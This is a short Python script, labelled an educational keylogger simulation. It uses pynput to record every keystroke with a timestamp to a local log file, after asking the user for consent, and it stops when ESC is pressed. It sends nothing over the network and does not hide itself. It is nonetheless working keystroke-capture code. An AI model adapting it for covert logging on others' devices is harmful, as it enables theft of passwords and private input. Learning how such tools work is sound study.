from pynput import keyboard
from datetime import datetime

LOG_FILE = "keystrokes.log"

def show_banner():
    print("=" * 45)
    print(" Educational Keylogger Simulation")
    print(" Developed by Ali Aarib")
    print(" For learning purposes only")
    print("=" * 45)
    print("Press ESC to stop logging\n")

def on_press(key):
    with open(LOG_FILE, "a") as f:
        try:
            f.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            f.write(f"{datetime.now()} - [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[+] Keylogging stopped.")
        return False

if __name__ == "__main__":
    show_banner()
    consent = input("Do you allow keystroke logging on THIS device? (yes/no): ")

    if consent.lower() != "yes":
        print("Permission denied. Exiting.")
        exit()

    print("[+] Logging started...")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
